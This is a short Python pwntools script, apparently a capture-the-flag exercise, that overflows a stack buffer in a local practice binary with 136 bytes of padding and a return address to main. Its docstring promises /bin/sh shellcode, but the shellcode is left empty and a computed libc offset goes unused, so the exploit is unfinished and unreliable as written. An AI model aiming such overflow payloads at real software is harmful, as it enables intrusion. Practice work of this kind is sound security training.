#!/usr/bin/python

'''
allocate a shellcode on the stack that launches `/bin/sh` and jump to it.
Assume that the shellcode address on the stack is known. No need to deal with
[cache
coherency](https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm)
on ARM, MIPS and PowerPC.
'''

import struct
import sys

from pwn import *


context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = '/home/gbrls/ctf/easy-linux-pwn/bin/x86-64/03-one-gadget'

p = process(binary_path)
#p = gdb.debug(binary_path, '''
#    set follow-fork-mode child
#''')


libc_off = 0x7ffff7dd9000 - 0x28000

# offset padding
payload = b''
payload += b'A' * 128
payload += b'A' * 8

shellcode = b''

payload += shellcode

payload += p64(p.elf.symbols['main'])

p.readuntil('> ')
p.write(payload)
p.interactive()
